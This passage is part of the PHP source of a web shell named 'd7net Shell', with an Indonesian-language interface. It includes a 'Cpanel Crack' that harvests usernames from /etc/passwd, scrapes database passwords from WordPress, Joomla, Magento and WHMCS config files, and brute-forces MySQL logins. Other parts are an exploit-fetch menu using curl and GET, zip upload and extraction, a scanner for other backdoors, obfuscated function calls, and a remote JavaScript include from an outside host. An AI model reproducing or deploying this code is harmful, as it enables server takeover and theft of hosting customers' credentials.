												<option value="wlinks">links</option>
												<option value="wget">GET</option>
												<option value="wcurl">curl</option>
											</select><br><input type="submit" name="expcompile" class="form-control" value="Go" style="width:80px;"></td>
									</tr>
								</form>
							</table>
						</td>
					</tr>
				</table>
			</center>
			<hr><br>
			<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
		<?php

		} elseif (isset($_GET[hex('zip-menu')])) {

			$dir = path();
			echo "<center>";
			echo "<br>";
			echo "<h2>UnZip</h2>";
			function rmdir_recursive($dir)
			{
				foreach (scandir($dir) as $file) {
					if ('.' === $file || '..' === $file) continue;
					if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
					else unlink("$dir/$file");
				}
				rmdir($dir);
			}
			if ($_FILES["zip_file"]["name"]) {
				$filename = $_FILES["zip_file"]["name"];
				$source = $_FILES["zip_file"]["tmp_name"];
				$type = $_FILES["zip_file"]["type"];
				$name = explode(".", $filename);
				$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
				foreach ($accepted_types as $mime_type) {
					if ($mime_type == $type) {
						$okay = true;
						break;
					}
				}
				$continue = strtolower($name[1]) == 'zip' ? true : false;
				if (!$continue) {
					$message = "UPLOAD Type Zip..!!";
				}
				$path = dirname(__FILE__) . '/';
				$filenoext = basename($filename, '.zip');
				$filenoext = basename($filenoext, '.ZIP');
				$targetdir = $path . $filenoext;
				$targetzip = $path . $filename;
				if (is_dir($targetdir)) rmdir_recursive($targetdir);
				mkdir($targetdir, 0777);
				if (move_uploaded_file($source, $targetzip)) {
					$zip = new ZipArchive();
					$x = $zip->open($targetzip);
					if ($x === true) {
						$zip->extractTo($targetdir);
						$zip->close();
						unlink($targetzip);
					}
					$message = "<b>Sukses !!</b>";
				} else {
					$message = "<b>Error !!</b>";
				}
			}			
			echo "
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input class='form-control' type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/d7net_unzip' style='width: 450px;' height='10'><br><br>
    <input class='form-control' type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    ";
			if ($_POST['extrak']) {
				$save = $_POST['save'];
				$zip = new ZipArchive;
				$res = $zip->open($_POST['dir']);
				if ($res === TRUE) {
					$zip->extractTo($save);
					$zip->close();
					echo 'Succes , Location : <b>' . $save . '</b>';
				} else {
					echo 'Failed!!!';
				}
			}
			echo '</table><hr>';
				} elseif (isset($_GET[hex('cp-crack')])) {

					if ($_POST['crack']) {
						$usercp = explode("\r\n", $_POST['user_cp']);
						$passcp = explode("\r\n", $_POST['pass_cp']);
						$i = 0;
						foreach ($usercp as $ucp) {
							foreach ($passcp as $pcp) {
								if (@mysql_connect('localhost', $ucp, $pcp)) {
									if ($_SESSION[$ucp] && $_SESSION[$pcp]) {
									} else {
										$_SESSION[$ucp] = "1";
										$_SESSION[$pcp] = "1";
										if ($ucp == '' || $pcp == '') {
										} else {
											$i++;
											if (function_exists('posix_getpwuid')) {
												$domain_cp = file_get_contents("/etc/named.conf");
												if ($domain_cp == '') {
													$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
												} else {
													preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
													foreach ($domains_cp[1] as $dj) {
														$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
														$user_cp_url = $user_cp_url['name'];
														if ($user_cp_url == $ucp) {
															$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
															break;
														}
													}
												}
											} else {
												$dom = "<font color=red>function is Disable by system</font>";
											}
											echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
										}
									}
								}
							}
						}
						if ($i == 0) {
						} else {
							echo "<br>sukses nyolong " . $i . " Cpanel by <font color=lime>d7net Shell.</font>";
						}
					} else {
						echo "<center><br>
		<form method='post'>
		<h2>Cpanel Crack</h2>
		USER: <br>
		<textarea class = 'form-control' style='width: 450px; height: 150px;' name='user_cp'>";
						$_usercp = fopen("/etc/passwd", "r");
						while ($getu = fgets($_usercp)) {
							if ($getu == '' || !$_usercp) {
								echo "<font color=red>Can't read /etc/passwd</font>";
							} else {
								preg_match_all("/(.*?):x:/", $getu, $u);
								foreach ($u[1] as $user_cp) {
									if (is_dir("/home/$user_cp/public_html")) {
										echo "$user_cp\n";
									}
								}
							}
						}
						echo "</textarea><br>
		PASS: <br>
		<textarea class= 'form-control' style='width: 450px; height: 200px;' name='pass_cp'>";
						function cp_pass($dir)
						{
							$pass = "";
							$dira = scandir($dir);
							foreach ($dira as $dirb) {
								if (!is_file("$dir/$dirb")) continue;
								$ambil = file_get_contents("$dir/$dirb");
								if (preg_match("/WordPress/", $ambil)) {
									$pass .= ambilkata($ambil, "DB_PASSWORD', '", "'") . "\n";
								} elseif (preg_match("/JConfig|joomla/", $ambil)) {
									$pass .= ambilkata($ambil, "password = '", "'") . "\n";
								} elseif (preg_match("/Magento|Mage_Core/", $ambil)) {
									$pass .= ambilkata($ambil, "<password><![CDATA[", "]]></password>") . "\n";
								} elseif (preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
									$pass .= ambilkata($ambil, 'password = "', '"') . "\n";
								} elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
									$pass .= ambilkata($ambil, "'DB_PASSWORD', '", "'") . "\n";
								} elseif (preg_match("/client/", $ambil)) {
									preg_match("/password=(.*)/", $ambil, $pass1);
									$pass .= $pass1[1] . "\n";
									if (preg_match('/"/', $pass1[1])) {
										$pass1[1] = str_replace('"', "", $pass1[1]);
										$pass .= $pass1[1] . "\n";
									}
								} elseif (preg_match("/cc_encryption_hash/", $ambil)) {
									$pass .= ambilkata($ambil, "db_password = '", "'") . "\n";
								}
							}
							echo $pass;
						}
						$cp_pass = cp_pass($dir);
						echo $cp_pass;
						echo "</textarea><br>
		<input class = 'form-control' type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form><br>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center><hr><br>";
}					
echo "<br>";
echo "<input class = 'form-control' style='width:250px;' type=\"submit\" name=\"submit\" value=\"Scan Now!\"/>\n";
echo "</form><hr><br>\n";
echo "<pre style=\"text-align: left;\">\n";
error_reporting(0);
/* */
if ($_POST['submit']) {
function tampilkan($shcdirs){
foreach (scandir($shcdirs) as $shc) {
if ($shc != '.' && $shc != '..') {
$shc = $shcdirs . DIRECTORY_SEPARATOR . $shc;
if (!is_dir($shc) && !eregi("css", $shc)) {
$fgt    = file_get_contents($shc);
$ifgt   = exif_read_data($shc);
$jembut = "COMPUTED";
$taik   = "UserComment";
$shcm = "/mail['(']/";
if ($ifgt[$jembut][$taik]) {
echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font><br>";}
preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#', $fgt, $cocok);
$hcs  = "/base64_decode/";
$exif = "/exif_read_data/";
preg_match($shcm, addslashes($fgt), $mailshc);
preg_match($hcs,  addslashes($fgt), $shcmar);
preg_match($exif, addslashes($fgt), $shcxif);
if (eregi('HTTP Cookie File', $fgt) || eregi('PHP Warning:', $fgt)) {
}
if (eregi('tmp_name', $fgt)) {
echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>" . $shc . "</font><br>";}
if ($shcmar[0]) {
echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>" . $shc . "</font><br>";}
if ($mailshc[0]) {
echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>" . $shc . "</font><br>";}if ($shcxif[0]) {
echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font> </font><font color=red>{Manual Check}</font><br>";}
if (eregi("js", $shc)) {
echo "[<font color=red>Javascript</font>] <font color=#2196F3>" . $shc . "</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";}
if ($cocok[0]) {
foreach ($cocok[0] as $key => $shcmail) {
if (filter_var($shcmail, FILTER_VALIDATE_EMAIL)) {
echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>" . $shc . "</font> { " . $shcmail . " }<br>";}
}
}
} else {
tampilkan($shc);
}
}
}
}
tampilkan($_POST['shc_dir']);
}
echo "</pre>\n";
echo "</Center>\n";
echo "</div>";
;
} elseif (isset($_GET[hex('logout')])) {
unset($_SESSION[sha1($_SERVER['HTTP_HOST'])]);
print "<script>window.location='?';</script>";
} elseif (isset($_GET["n"])) {
echo $a_ . '<br>[ New File ]' . $b_ . '
<form action="" method="post">
<input name="n" autocomplete="off" class="form-control col-md-3" type="text" value="">
' . $d7net_ . '
' . $c_;
if (isset($_POST["n"])) {
if (!$GNJ[25]($_POST["n"])) {
ER();
} else {
OK();
}
}
} elseif (isset($_GET["r"])) {
echo $a_ . uhex($_GET["r"]) . $b_ . '
<form action="" method="post">
<input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="' . uhex($_GET["r"]) . '">
' . $d7net_ . '
' . $c_;
if (isset($_POST["r"])) {
if ($GNJ[26]($_POST["r"])) {
ER();
} else {
if ($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
OK();
} else {
ER();
}
}
}
} elseif (isset($_GET["z"])) {
$zip = new ZipArchive;
$res = $zip->open(uhex($_GET["z"]));
if ($res === TRUE) {
$zip->extractTo(uhex($_GET["d"]));
$zip->close();
OK();
} else {
ER();
}
} else {
echo '<table class = "table table-bordered mt-3" >
						<thead>
							<tr>
								<th><center> NAME </center></th>
								<th><center> TYPE </center></th>
								<th><center> SIZE </center></th>
								<th><center> LAST MODIFIED </center></th>
								<th><center> OWNER\GROUP </center></th>
								<th><center> PERMISSION </center></th>
								<th><center> ACTION </center></th>
							</tr>
						</thead>
						<tbody>';$h = "";
$j = "";
$w = $GNJ[13]($d7net);
if ($GNJ[28]($w) || $GNJ[29]($w)) {
foreach ($w as $c) {
$e = $GNJ[14]("\\", "/", $d7net);
if (!$GNJ[30]($c, ".zip")) {
$zi = '';
} else {
$zi = '<a href="?d7net=' . hex($e) . '&z=' . hex($c) . '"></a>';
}if ($GNJ[31]("$d7net/$c")) {
$o = "";
} elseif (!$GNJ[32]("$d7net/$c")) {
$o = " h";
} else {
$o = " w";
}
$s = $GNJ[34]("$d7net/$c") / 1024;
$s = round($s, 3);
if ($s >= 1024) {
$s = round($s / 1024, 2) . " MB";
} else {
$s = $s . " KB";
}
if (($c != ".") && ($c != "..")) {
($GNJ[8]("$d7net/$c")) ?
$h .= '<tr class="r">
<td><img src = "https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png" width = "25px" height = "25px">
<a href="?d7net=' . hex($e) . hex("/" . $c) . '">' . $c . '</a>
</td>
<td><center>Dir</center></td>
<td class="x">
<center>-</center>
</td>
<td class="x">
<center>
<a href="?d7net=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d7net/$c")) . ' <i class="fa fa-pencil" style="font-size:15px"></i></a>
								</center>
							</td>
							<td class = "x">
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
							<td class="x">
							<center>
								<a class="' . $o . '" href="?d7net=' . hex($e) . '&k=' . hex($c) . '">' . x("$d7net/$c") . ' <i class="fa fa-pencil" style="font-size:15px"></i></a>
							</center>
							</td>
							<td class="x">
							<center>
								<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&r=' . hex($c) . '">
								<i class="fa fa-pencil" style="font-size:15px" title="rename"></i></a>
								<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&x=' . hex($c) . '">
								<i class="fa fa-trash" style="font-size:15px" title="delete"></i></a>
								</center>
							</td>
						</tr>':
$j .= '<tr class="r">
<td>
<img src = "https://img.icons8.com/external-kmg-design-outline-color-kmg-design/2x/external-file-web-hosting-kmg-design-outline-color-kmg-design.png" width = "25px" height = "25px">
<a href="?d7net=' . hex($e) . '&s=' . hex($c) . '">' . $c . '</a>
</td>
							<td>
							<center>
							File
							</center>
							</td>
							<td class="x">
							<center>
								' . $s . '
								</center>
							</td>
							<td class="x">
							<center>
								<a href="?d7net=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d7net/$c")) . '</a> <i class="fa fa-pencil" style="font-size:15px"></i>	
								</center>
							</td>	
							<td>
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
								<td class="x">
								<center>
							<a class="' . $o . '" href="?d7net=' . hex($e) . '&k=' . hex($c) . '">' . x("$d7net/$c") . '</a>
							 <i class="fa fa-pencil" style="font-size:15px"></i>
							</center>
							</td>
							
							<td class="x">
								<center>
<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&e=' . hex($c) . '">
<i class="fa fa-edit" style="font-size:17px" title="edit"></i></a> 

<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&r=' . hex($c) . '">
<i class="fa fa-pencil" style="font-size:15px" title="Rename" title="rename"></i></a> 

<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&g=' . hex($c) . '">
<i class="fa fa-download" style="font-size:15px" title="download"></i></a> 
								' . $zi . '
<a class="btn btn-outline-light" href="?d7net=' . hex($e) . '&x=' . hex($c) . '">
<i class="fa fa-trash" style="font-size:15px" title="delete"></i></a>
								</center>
							</td>
						</tr>';
						}
			}
		}
echo $h;
echo $j;
echo '</tbody>
</table>';
	}
?>
<?php
$footers ="\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x63\x65\x6e\x74\x65\x72\x3e\x26\x63\x6f\x70\x79\x3b\x20\x3c\x73\x70\x61\x6e\x20\x69\x64\x3d\x22\x66\x6f\x6f\x74\x65\x72\x22\x3e\x3c\x2f\x73\x70\x61\x6e\x3e\x20\x32\x30\x31\x38\x2e\x20\x7c\x20\x61\x6c\x6c\x20\x72\x69\x67\x68\x74\x73\x20\x72\x65\x73\x65\x72\x76\x65\x64\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e	";
echo $footers ;
echo '<script type="text/javascript" src="https://bellpwn.github.io/opet/footer.js"></script></footer>';
				if (isset($_GET["1"])) {
					echo $f;
				} elseif (isset($_GET["0"])) {
					echo $g;
				} else {
					NULL;
				}
				?>
				<script>
					$(".d7net").click(function(t) {
						t.preventDefault();
						var e = $(this).attr("href");
						history.pushState("", "", e), $.get(e, function(t) {
							$("body").html(t)
						})
					});
				</script>
	</body>

	</html>
	<?php
	function rec($j)
	{
		global $GNJ;
		if (trim(pathinfo($j, PATHINFO_BASENAME), '.') === '') {
			return;
		}
		if ($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		} else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2)
	{
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n)
	{
		$y = '';
		for ($i = 0; $i < strlen($n); $i++) {
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y)
	{
		$n = '';
		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
		}
		return $n;
	}
	function OK()
	{
		global $GNJ, $d7net;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d7net=" . hex($d7net) . "&1");
		exit();
	}
	function ER()
	{
		global $GNJ, $d7net;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d7net=" . hex($d7net) . "&0");
		exit();
	}
	function x($c)
	{
		global $GNJ;
		$x = $GNJ[24]($c);
		if (($x & 0xC000) == 0xC000) {
			$u = "s";
		} elseif (($x & 0xA000) == 0xA000) {
			$u = "l";
		} elseif (($x & 0x8000) == 0x8000) {
			$u = "-";
		} elseif (($x & 0x6000) == 0x6000) {
			$u = "b";
		} elseif (($x & 0x4000) == 0x4000) {
			$u = "d";
		} elseif (($x & 0x2000) == 0x2000) {
			$u = "c";
		} elseif (($x & 0x1000) == 0x1000) {
			$u = "p";
		} else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if (isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: " . $GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"" . uhex($_GET["g"]) . "\"");
		$GNJ[37](uhex($_GET["g"]));
	}

	?>